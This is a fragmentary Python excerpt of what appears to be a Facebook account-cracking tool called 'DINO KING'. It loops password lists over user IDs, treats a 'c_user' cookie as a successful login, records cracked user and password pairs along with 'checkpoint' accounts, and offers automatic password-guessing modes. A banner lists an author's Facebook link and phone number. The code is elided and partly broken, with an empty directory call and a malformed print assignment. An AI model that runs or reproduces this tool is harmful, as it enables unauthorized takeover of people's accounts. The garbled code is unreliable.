...
def readline___Public_Xml():
			...
			print (' [*]=============================================')
			print ("\033[1m [!] Tool    : DINO KING")
			print (" [!] Status  : \033[1;92mPremium\033[1;97m")
			print(" [!] Expired : 30 April")
			print (' [*]=============================================')
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [DINO-KING] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[Successful-DINO] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[Checkpoint-DINO] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					...
					pass
				print('\r\033[1;91m[Checkpoint-DINO] %s | %s%s      ' % (user,pw,tahun(user)))
	...
	def __pler__(self):
		...
		print (" [2] Auto 5 Pass (Slow)")
		print (" [3] Auto 2 Digit Pass (Fast)")
...
banner="""\033[1;37m
 ...
 [*]=============================================
    Author   : DINO KING
    Facebook : https://facebook.com/SHAHDINOBALOCH15
    Team     : DINO + AKING
    Version   : 1.0.0
    Connect  : 03175889358
 [*]=============================================
